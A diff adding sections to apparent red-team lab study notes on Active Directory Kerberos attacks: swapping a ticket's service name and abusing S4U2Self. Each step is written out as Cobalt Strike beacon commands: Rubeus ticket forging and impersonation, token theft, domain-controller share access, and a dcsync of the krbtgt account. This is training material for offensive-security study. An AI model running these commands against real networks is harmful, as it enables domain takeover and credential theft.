@@ -130,3 +130,46 @@ Always use the FQDN. Otherwise, there will be 1326 errors:
 
     beacon> ls \\dc-2\c$
     [-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE
+
+## Alternate Service Name
+
+The CIFS service is good for grabbing files, but if port 445 is blocked or for lateral movement, can abuse the alt svc name feature (confirmed as "by design" by Microsoft).
+
+In the Kerberos authentication protocol, a service validates an inbound ticket by checking that service's symmetric key. This key is derived from the password hash of the principal running the service. Most services run in the SYSTEM context of a computer account, e.g. SQL-2$. Therefore, all service tickets will be encrypted with the same key. The SPN does not factor into ticket validation. The SPN information in the ticket (i.e. the sname field) is not encrypted and can be changed arbitrarily. So we can request a service ticket for a service but then modify the SPN to a different service and the target service will accept it.
+
+Use /altservice in Rubeus. This example uses the same TGT for SQL-2 to request a TGS for LDAP instead of CIFS:
+
+    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io altservice:ldap /user:sql-2$ /ticket:doIFpD... /nowrap
+    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV username:nlamb /password:FakePass /ticket:doIGaD...
+    beacon> steal_token 2580
+
+LDAP service allows performing dcsync against a domain controller:
+
+    beacon> dcsync dev.cyberbotic.io DEV\krbtgt
+
+## S4U2Self Abuse
+
+As above, there are two S4U (Service for User) extensions:
+
+* S4U2Self (Service for User to Self) - service obtains a TGS to itself on behalf of a user
+* S4U2Proxy (Service for User to Proxy) - service obtains a TGS on behalf of a user to a second service
+
+In abusing constrained delegation above, Rubeus first builds an S4U2Self request and obtains a TGS for nlamb to sql-2/dev.cyberbotic.io; then builds an S4U2Proxy request to obtain a TGS for nlamb to cifs/dc-2.dev.cyberbotic.io. This is working by design because SQL-2 is specifically trusted for delegation to that service.
+
+Another way to abuse the S4U2Self extension is to gain access to a computer with its TGT. In the Unconstrained Delegation module, we obtained a TGT for the domain controller. Passing that to a logon session and accessing the C$ share would fail. 
+
+    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj...
+    beacon> steal_token 2832
+    beacon> ls \\dc-2.dev.cyberbotic.io\c$
+    [-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
+
+Machines do not get remote local admin access to themselves. Instead abuse S4U2Self to obtain a usable TGS as a user we know is a local admin (e.g. a domain admin). Rubeus has a /self flag for this:
+
+    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj... /nowrap
+    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD...
+    beacon> steal_token 2664
+    beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+
+    
+
